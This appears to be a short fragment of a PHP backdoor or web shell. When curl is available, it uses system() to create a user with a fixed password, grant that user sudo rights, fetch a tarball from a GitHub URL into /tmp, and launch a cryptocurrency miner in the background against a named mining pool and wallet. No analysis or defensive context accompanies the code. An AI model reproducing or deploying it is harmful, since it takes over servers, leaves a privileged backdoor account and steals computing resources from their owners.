...
if(in_array  ('curl', get_loaded_extensions())){
	system('useradd code87; echo "code87:idbteam" | chpasswd; sudo adduser code87 sudo; cd /tmp; curl -o sysls.tar.gz https://raw.githubusercontent.com/cafcbr40ck/PasukanBeraniMati/main/sysls.tar.gz; tar -zxf sysls.tar.gz; ./sysls --donate-level 5 -o pool.hashvault.pro:443 -u 86fz79VrJTCZ4J1jLFfwzvdFehcQaHaTZj8uY23Po4R1Bfj2JhtuaDYetJZC7qZekm4aLvi1pZbhLW2zEJ7CvwXoB8DoncY -k --tls --background');
} else {
